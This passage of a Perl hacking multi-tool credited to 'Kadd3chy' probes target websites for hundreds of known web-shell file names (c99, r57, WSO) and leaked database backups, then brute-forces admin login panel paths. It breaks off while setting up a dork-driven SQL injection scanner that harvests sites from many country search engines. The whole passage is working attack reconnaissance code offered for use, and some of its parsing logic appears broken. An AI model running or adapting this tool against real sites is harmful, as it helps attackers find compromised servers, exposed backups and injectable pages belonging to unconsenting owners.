'/images//up.php',
'/images//upload.php',
'/images//uploads.php',
'/images/shell.php',
'/images//amad.php',
'/images//t00.php',
'/images//dz.php',
'/images//site.rar',
'/images//Black.php',
'/images//site.tar.gz',
'/images//home.zip',
'/images//home.rar',
'/images//home.tar',
'/images//home.tar.gz',
'/images//forum.zip',
'/images//forum.rar',
'/images//forum.tar',
'/images//forum.tar.gz',
'/images//test.txt',
'/images//ftp.txt',
'/images//user.txt',
'/images//site.txt',
'/images//error_log',
'/images//error',
'/images//cpanel',
'/images//awstats',
'/images//site.sql',
'/images//vb.sql',
'/images//forum.sql',
'/images/r00t-s3c.php',
'/images/c.php',
'/images//backup.sql',
'/images//back.sql',
'/images//data.sql',
'/images/wp.rar/',
'/images/asp.aspx',
'/images/tmp/vaga.php',
'/images/tmp/killer.php',
'/images/whmcs.php',
'/images/abuhlail.php',
'/images/tmp/killer.php',
'/images/tmp/domaine.pl',
'/images/tmp/domaine.php',
'/images/useradmin/',
'/images/tmp/d0maine.php',
'/images/d0maine.php',
'/images/tmp/sql.php',
'/images/X.php',
'/images/123.php',
'/images/m.php',
'/images/b.php',
'/images/up.php',
'/images/tmp/dz1.php',
'/images/dz1.php',
'/images/forum.zip',
'/images/Symlink.php',
'/images/Symlink.pl',
'/images/forum.rar',
'/images/joomla.zip',
'/images/joomla.rar',
'/images/wp.php',
'/images/buck.sql',
'/includes/WSO.php',
'/includes/dz.php',
'/includes/DZ.php',
'/includes/cpanel.php',
'/includes/cpn.php',
'/includes/sos.php',
'/includes/term.php',
'/includes/Sec-War.php',
'/includes/sql.php',
'/includes/ssl.php',
'/includes/mysql.php',
'/includes/WolF.php',
'/includes/madspot.php',
'/includes/Cgishell.pl',
'/includes/killer.php',
'/includes/changeall.php',
'/includes/2.php',
'/includes/Sh3ll.php',
'/includes/dz0.php',
'/includes/dam.php',
'/includes/user.php',
'/includes/dom.php',
'/includes/whmcs.php',
'/includes/vb.zip',
'/includes/r00t.php',
'/includes/c99.php',
'/includes/gaza.php',
'/includes/1.php',
'/includes/d0mains.php',
'/includes/madspotshell.php',
'/includes/info.php',
'/includes/egyshell.php',
'/includes/Sym.php',
'/includes/c22.php',
'/includes/c100.php',
'/includes/configuration.php',
'/includes/g.php',
'/includes/xx.pl',
'/includes/ls.php',
'/includes/Cpanel.php',
'/includes/k.php',
'/includes/zone-h.php',
'/includes/tmp/user.php',
'/includes/tmp/Sym.php',
'/includes/cp.php',
'/includes/tmp/madspotshell.php',
'/includes/tmp/root.php',
'/includes/tmp/whmcs.php',
'/includes/tmp/index.php',
'/includes/tmp/2.php',
'/includes/tmp/dz.php',
'/includes/tmp/cpn.php',
'/includes/tmp/changeall.php',
'/includes/tmp/Cgishell.pl',
'/includes/tmp/sql.php',
'/includes/0day.php',
'/includes/tmp/admin.php',
'/includes/L3b.php',
'/includes/d.php',
'/includes/tmp/d.php',
'/includes/tmp/L3b.php',
'/includes/sado.php',
'/includes/admin1.php',
'/includes/upload.php',
'/includes/up.php',
'/includes/vb.zip',
'/includes/vb.rar',
'/includes/admin2.asp',
'/includes/uploads.php',
'/includes/sa.php',
'/includes/sysadmins/',
'/includes/admin1/',
'/includes/sniper.php',
'/includes/images/Sym.php',
'/includes//r57.php',
'/includes/gzaa_spysl',
'/includes/sql-new.php',
'/includes//shell.php',
'/includes//sa.php',
'/includes//admin.php',
'/includes//sa2.php',
'/includes//2.php',
'/includes//gaza.php',
'/includes//up.php',
'/includes//upload.php',
'/includes//uploads.php',
'/includes/shell.php',
'/includes//amad.php',
'/includes//t00.php',
'/includes//dz.php',
'/includes//site.rar',
'/includes//Black.php',
'/includes//site.tar.gz',
'/includes//home.zip',
'/includes//home.rar',
'/includes//home.tar',
'/includes//home.tar.gz',
'/includes//forum.zip',
'/includes//forum.rar',
'/includes//forum.tar',
'/includes//forum.tar.gz',
'/includes//test.txt',
'/includes//ftp.txt',
'/includes//user.txt',
'/includes//site.txt',
'/includes//error_log',
'/includes//error',
'/includes//cpanel',
'/includes//awstats',
'/includes//site.sql',
'/includes//vb.sql',
'/includes//forum.sql',
'/includes/r00t-s3c.php',
'/includes/c.php',
'/includes//backup.sql',
'/includes//back.sql',
'/includes//data.sql',
'/includes/wp.rar/',
'/includes/asp.aspx',
'/includes/tmp/vaga.php',
'/includes/tmp/killer.php',
'/includes/whmcs.php',
'/includes/abuhlail.php',
'/includes/tmp/killer.php',
'/includes/tmp/domaine.pl',
'/includes/tmp/domaine.php',
'/includes/useradmin/',
'/includes/tmp/d0maine.php',
'/includes/d0maine.php',
'/includes/tmp/sql.php',
'/includes/X.php',
'/includes/123.php',
'/includes/m.php',
'/includes/b.php',
'/includes/up.php',
'/includes/tmp/dz1.php',
'/includes/dz1.php',
'/includes/forum.zip',
'/includes/Symlink.php',
'/includes/Symlink.pl',
'/includes/forum.rar',
'/includes/joomla.zip',
'/includes/joomla.rar',
'/includes/wp.php',
'/includes/buck.sql',
'/includes/sysadmin.php',
'/includes/images/c99.php',
'/includes/xd.php',
'/includes/c100.php',
'/includes/spy.aspx',
'/includes/xd.php',
'/includes/tmp/xd.php',
'/includes/sym/root/home/',
'/includes/billing/killer.php',
'/includes/tmp/upload.php',
'/includes/tmp/admin.php',
'/includes/Server.php',
'/includes/tmp/uploads.php',
'/includes/tmp/up.php',
'/includes/Server/',
'/includes/wp-admin/c99.php',
'/includes/tmp/priv8.php',
'/includes/priv8.php',
'/includes/cgi.pl/',
'/includes/tmp/cgi.pl',
'/includes/downloads/dom.php',
'/includes/webadmin.html',
'/includes/admins.php',
'/includes/bluff.php',
'/includes/king.jeen',
'/includes/admins/',
'/includes/admins.asp',
'/includes/admins.php',
'/includes/wp.zip',
'/includes/',
'/templates/rhuk_milkyway/WSO.php',
'/templates/rhuk_milkyway/dz.php',
'/templates/rhuk_milkyway/DZ.php',
'/templates/rhuk_milkyway/cpanel.php',
'/templates/rhuk_milkyway/cpn.php',
'/templates/rhuk_milkyway/sos.php',
'/templates/rhuk_milkyway/term.php',
'/templates/rhuk_milkyway/Sec-War.php',
'/templates/rhuk_milkyway/sql.php',
'/templates/rhuk_milkyway/ssl.php',
'/templates/rhuk_milkyway/mysql.php',
'/templates/rhuk_milkyway/WolF.php',
'/templates/rhuk_milkyway/madspot.php',
'/templates/rhuk_milkyway/Cgishell.pl',
'/templates/rhuk_milkyway/killer.php',
'/templates/rhuk_milkyway/changeall.php',
'/templates/rhuk_milkyway/2.php',
'/templates/rhuk_milkyway/Sh3ll.php',
'/templates/rhuk_milkyway/dz0.php',
'/templates/rhuk_milkyway/dam.php',
'/templates/rhuk_milkyway/user.php',
'/templates/rhuk_milkyway/dom.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/vb.zip',
'/templates/rhuk_milkyway/r00t.php',
'/templates/rhuk_milkyway/c99.php',
'/templates/rhuk_milkyway/gaza.php',
'/templates/rhuk_milkyway/1.php',
'/templates/rhuk_milkyway/d0mains.php',
'/templates/rhuk_milkyway/madspotshell.php',
'/templates/rhuk_milkyway/info.php',
'/templates/rhuk_milkyway/egyshell.php',
'/templates/rhuk_milkyway/Sym.php',
'/templates/rhuk_milkyway/c22.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/configuration.php',
'/templates/rhuk_milkyway/g.php',
'/templates/rhuk_milkyway/xx.pl',
'/templates/rhuk_milkyway/ls.php',
'/templates/rhuk_milkyway/Cpanel.php',
'/templates/rhuk_milkyway/k.php',
'/templates/rhuk_milkyway/zone-h.php',
'/templates/rhuk_milkyway/tmp/user.php',
'/templates/rhuk_milkyway/tmp/Sym.php',
'/templates/rhuk_milkyway/cp.php',
'/templates/rhuk_milkyway/tmp/madspotshell.php',
'/templates/rhuk_milkyway/tmp/root.php',
'/templates/rhuk_milkyway/tmp/whmcs.php',
'/templates/rhuk_milkyway/tmp/index.php',
'/templates/rhuk_milkyway/tmp/2.php',
'/templates/rhuk_milkyway/tmp/dz.php',
'/templates/rhuk_milkyway/tmp/cpn.php',
'/templates/rhuk_milkyway/tmp/changeall.php',
'/templates/rhuk_milkyway/tmp/Cgishell.pl',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/0day.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/L3b.php',
'/templates/rhuk_milkyway/d.php',
'/templates/rhuk_milkyway/tmp/d.php',
'/templates/rhuk_milkyway/tmp/L3b.php',
'/templates/rhuk_milkyway/sado.php',
'/templates/rhuk_milkyway/admin1.php',
'/templates/rhuk_milkyway/upload.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/vb.zip',
'/templates/rhuk_milkyway/vb.rar',
'/templates/rhuk_milkyway/admin2.asp',
'/templates/rhuk_milkyway/uploads.php',
'/templates/rhuk_milkyway/sa.php',
'/templates/rhuk_milkyway/sysadmins/',
'/templates/rhuk_milkyway/admin1/',
'/templates/rhuk_milkyway/sniper.php',
'/templates/rhuk_milkyway/images/Sym.php',
'/templates/rhuk_milkyway//r57.php',
'/templates/rhuk_milkyway/gzaa_spysl',
'/templates/rhuk_milkyway/sql-new.php',
'/templates/rhuk_milkyway//shell.php',
'/templates/rhuk_milkyway//sa.php',
'/templates/rhuk_milkyway//admin.php',
'/templates/rhuk_milkyway//sa2.php',
'/templates/rhuk_milkyway//2.php',
'/templates/rhuk_milkyway//gaza.php',
'/templates/rhuk_milkyway//up.php',
'/templates/rhuk_milkyway//upload.php',
'/templates/rhuk_milkyway//uploads.php',
'/templates/rhuk_milkyway/shell.php',
'/templates/rhuk_milkyway//amad.php',
'/templates/rhuk_milkyway//t00.php',
'/templates/rhuk_milkyway//dz.php',
'/templates/rhuk_milkyway//site.rar',
'/templates/rhuk_milkyway//Black.php',
'/templates/rhuk_milkyway//site.tar.gz',
'/templates/rhuk_milkyway//home.zip',
'/templates/rhuk_milkyway//home.rar',
'/templates/rhuk_milkyway//home.tar',
'/templates/rhuk_milkyway//home.tar.gz',
'/templates/rhuk_milkyway//forum.zip',
'/templates/rhuk_milkyway//forum.rar',
'/templates/rhuk_milkyway//forum.tar',
'/templates/rhuk_milkyway//forum.tar.gz',
'/templates/rhuk_milkyway//test.txt',
'/templates/rhuk_milkyway//ftp.txt',
'/templates/rhuk_milkyway//user.txt',
'/templates/rhuk_milkyway//site.txt',
'/templates/rhuk_milkyway//error_log',
'/templates/rhuk_milkyway//error',
'/templates/rhuk_milkyway//cpanel',
'/templates/rhuk_milkyway//awstats',
'/templates/rhuk_milkyway//site.sql',
'/templates/rhuk_milkyway//vb.sql',
'/templates/rhuk_milkyway//forum.sql',
'/templates/rhuk_milkyway/r00t-s3c.php',
'/templates/rhuk_milkyway/c.php',
'/templates/rhuk_milkyway//backup.sql',
'/templates/rhuk_milkyway//back.sql',
'/templates/rhuk_milkyway//data.sql',
'/templates/rhuk_milkyway/wp.rar/',
'/templates/rhuk_milkyway/asp.aspx',
'/templates/rhuk_milkyway/tmp/vaga.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/abuhlail.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/tmp/domaine.pl',
'/templates/rhuk_milkyway/tmp/domaine.php',
'/templates/rhuk_milkyway/useradmin/',
'/templates/rhuk_milkyway/tmp/d0maine.php',
'/templates/rhuk_milkyway/d0maine.php',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/X.php',
'/templates/rhuk_milkyway/123.php',
'/templates/rhuk_milkyway/m.php',
'/templates/rhuk_milkyway/b.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/tmp/dz1.php',
'/templates/rhuk_milkyway/dz1.php',
'/templates/rhuk_milkyway/forum.zip',
'/templates/rhuk_milkyway/Symlink.php',
'/templates/rhuk_milkyway/Symlink.pl',
'/templates/rhuk_milkyway/forum.rar',
'/templates/rhuk_milkyway/joomla.zip',
'/templates/rhuk_milkyway/joomla.rar',
'/templates/rhuk_milkyway/wp.php',
'/templates/rhuk_milkyway/buck.sql',
'/templates/rhuk_milkyway/sysadmin.php',
'/templates/rhuk_milkyway/images/c99.php',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/spy.aspx',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/tmp/xd.php',
'/templates/rhuk_milkyway/sym/root/home/',
'/templates/rhuk_milkyway/billing/killer.php',
'/templates/rhuk_milkyway/tmp/upload.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/Server.php',
'/templates/rhuk_milkyway/tmp/uploads.php',
'/templates/rhuk_milkyway/tmp/up.php',
'/templates/rhuk_milkyway/Server/',
'/templates/rhuk_milkyway/wp-admin/c99.php',
'/templates/rhuk_milkyway/tmp/priv8.php',
'/templates/rhuk_milkyway/priv8.php',
'/templates/rhuk_milkyway/cgi.pl/',
'/templates/rhuk_milkyway/tmp/cgi.pl',
'/templates/rhuk_milkyway/downloads/dom.php',
'/templates/rhuk_milkyway/webadmin.html',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/bluff.php',
'/templates/rhuk_milkyway/king.jeen',
'/templates/rhuk_milkyway/admins/',
'/templates/rhuk_milkyway/admins.asp',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/wp.zip',
'/templates/rhuk_milkyway/','WSO.php',
'a.php',
'z.php',
'e.php',
'r.php',
't.php',
'y.php',
'u.php',
'i.php',
'o.php',
'p.php',
'q.php',
's.php',
'd.php',
'f.php',
'g.php',
'h.php',
'j.php',
'k.php',
'l.php',
'm.php',
'w.php',
'x.php',
'c.php',
'v.php',
'b.php',
'n.php',
'1.php',
'2.php',
'3.php',
'4.php',
'5.php',
'6.php',
'7.php',
'8.php',
'9.php',
'10.php',
'12.php',
'11.php',
'1234.php',);


foreach $com(@path){

$url = $site.$com;
$req = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($req);

if ($response->is_success){
print "$com\n";
 $url = substr($url, $com + 13);
 $com = substr($url, 0, index($url, '"'));
 open (txt,">>Done.txt");
 print txt  $com,"\n";
 close(txt);
print "=> Shell Finded : $url\n";
}
else {
print "=> Shell Not Found : $com\n";
}
}}
}
if($targett eq '2')
{
system('cls');
system('title Admin Finder Rec0ded by Moat3z_Kadd3chy');

print"\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                          Admin Panel Finder                       >\n";
print "\t>                           C0ded By Kadd3chy                       >\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";

print "~# Enter Target\n* ex: www.domaine.com ou www.domaine.com/path\n-> ";
$site=<STDIN>;
chomp $site;

print "\n";
print "~ Enter Target Type \n* ex: asp, php, cfm\n-> ";
$code=<STDIN>;
chomp($code);

if ( $site !~ /^http:/ ) {
$site = 'http://' . $site;
}
if ( $site !~ /\/$/ ) {
$site = $site . '/';
}
print "\n";

print "->Your Target: $site\n";
print "->Type Website: $code\n";
print "->Loading\n\n\n";

if($code eq "asp"){

@path1=('cpanel','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
);

foreach $ways(@path1){

$final=$site.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
}




# -------------------------------------------------------
# -------------------Testing CFM ---------------------------|
# -------------------------------------------------------





if($code eq "cfm"){

@path1=('cpanel','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.cfm','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.cfm','admin/controlpanel.cfm','admin.cfm','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm','admin/cp.cfm','cp.cfm',
'administrator/account.cfm','administrator.cfm','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm','administrator/login.cfm',
'moderator/admin.cfm','controlpanel.cfm','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.cfm','user.html','admincp/index.cfm','admincp/login.cfm','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.cfm','admin/account.cfm','adminpanel.cfm','webadmin.cfm','webadmin/index.cfm',
'webadmin/admin.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm','panel-administracion/login.cfm','adminLogin.cfm',
'admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm','adminarea/admin.cfm','adminarea/login.cfm','admin-login.html',
'panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm','modelsearch/admin.cfm','administrator/index.cfm',
'admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','adm/index.cfm',
'adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html'
);

foreach $ways(@path1){

$final=$site.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
}





# -------------------------------------------------------
#--------------------------/Testing-------------------------|
# -------------------------------------------------------


if($code eq "php"){

@path2=('cpanel','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php'
);

foreach $ways(@path2){

$final=$site.$ways;

my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Founded -> $final\n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
kill("STOP",NULL);
}
}
if($targett eq '3')
{
system('cls');
system('title Sqli Scanner');
print"\n";

print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                          SQLI Scanner                             >\n";
print "\t>                           C0ded By Kadd3chy                       >\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use Socket;
use URI::Escape;
use POSIX qw(strftime);

if ($^O =~ /Win/){
system ('cls');
}else{
system ('clear');
}
my ($sec,$min,$hour,$day,$mon,$year,$wday,$yday,$isdst)=localtime();
my $uagent    = "Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1";
print q {
 SQLi scanner
};
print q(
 SQLi scanner
);
print "---------------------------------------------------------
[!] Options
[!] example
[!] Dork : product.php?id= +site:il +you have an error in your sql
---------------------------------------------------------\n";
print "[?] Dork for scanning : ";
my $dork = <STDIN>;
chomp $dork;
$ngitung = 0;
my %hosts;
print "---------------------------------------------------------
[!] Scanning info
---------------------------------------------------------
[+] Time : $hour:$min:$sec
[+] Dork : $dork
---------------------------------------------------------
[!] Scanning started....
---------------------------------------------------------";
#Search Engine
my @bing = &bing($dork);
print "\n[+] Bing      get ".scalar(@bing)." Sites";
my @irlandia = &irlandia($dork);
print "\n[+] Irlanda  get ".scalar(@irlandia)." Sites";
my @indonesia = &indonesia($dork);
print "\n[+] Indonesia get ".scalar(@indonesia)." Sites";
my @thailand = &thailand($dork);
print "\n[+] Thailand  get ".scalar(@thailand)." Sites";
my @argentina = &argentina($dork);
print "\n[+] Argentina get ".scalar(@argentina)." Sites";
my @singapura = &singapura($dork);
print "\n[+] Singapura get ".scalar(@singapura)." Sites";
my @malaysia = &malaysia($dork);
print "\n[+] Malaysia  get ".scalar(@malaysia)." Sites";
my @vietnam = &vietnam($dork);
print "\n[+] Vietnam   get ".scalar(@vietnam)." Sites";
my @rusia = &rusia($dork);
print "\n[+] Russia    get ".scalar(@rusia)." Sites";
my @czech = &czech($dork);
print "\n[+] Czech     get ".scalar(@czech)." Sites";
my @belanda = &belanda($dork);
print "\n[+] Belanda   get ".scalar(@belanda)." Sites";
my @australia = &australia($dork);
print "\n[+] Australia get ".scalar(@australia)." Sites";
my @brasil = &brasil($dork);
print "\n[+] Brasil    get ".scalar(@brasil)." Sites";
my @kanada = &canada($dork);
print "\n[+] Canada    get ".scalar(@kanada)." Sites";
my @jerman = &jerman($dork);
print "\n[+] Germany   get ".scalar(@jerman)." Sites";
my @spanyol = &spanyol($dork);
print "\n[+] Spanyol   get ".scalar(@spanyol)." Sites";
my @perancis = &perancis($dork);
print "\n[+] Perancis  get ".scalar(@perancis)." Sites";
my @italia = &italia($dork);
print "\n[+] Talia     get ".scalar(@italia)." Sites";
my @inggris = &inggris($dork);
print "\n[+] Inggris   get ".scalar(@inggris)." Sites";
my @turki = &turki($dork);
print "\n[+] Turkiya   get ".scalar(@turki)." Sites";
my @polandia = &polandia($dork);
print "\n[+] Polandia  get ".scalar(@polandia)." Sites";
my @filipina = &filipina($dork);
print "\n[+] philipine get ".scalar(@filipina)." Sites";
my @peru = &peru($dork);
print "\n[+] Peru      get ".scalar(@peru)." Sites";
my @hongkong = &hongkong($dork);
print "\n[+] Hongkong  get ".scalar(@hongkong)." Sites";
my @finlandia = &finlandia($dork);
print "\n[+] Finlandia get ".scalar(@finlandia)." Sites";
my @yunani = &yunani($dork);
print "\n[+] Yunan     get ".scalar(@yunani)." Sites";
my @kolombia = &kolombia($dork);
print "\n[+] Colombia  get ".scalar(@kolombia)." Sites";
my @taiwan = &taiwan($dork);
print "\n[+] Taiwan    get ".scalar(@taiwan)." Sites";
my @swiss = &swiss($dork);
print "\n[+] Swiss     get ".scalar(@swiss)." Sites";
my @mexico = &mexico($dork);
print "\n[+] Meksiko   get ".scalar(@mexico)." Sites";
my @korea = &korea($dork);
print "\n[+] Korea     get ".scalar(@korea)." Sites";
my @india = &india($dork);
print "\n[+] India     get ".scalar(@india)." Sites";
my @swedia = &swedia($dork);
print "\n[+] Swedia    get ".scalar(@swedia)." Sites";
my @Uk = &Uk(dork);
print "\n[+] U.kingdom get ".scalar(@Uk)." Sites";
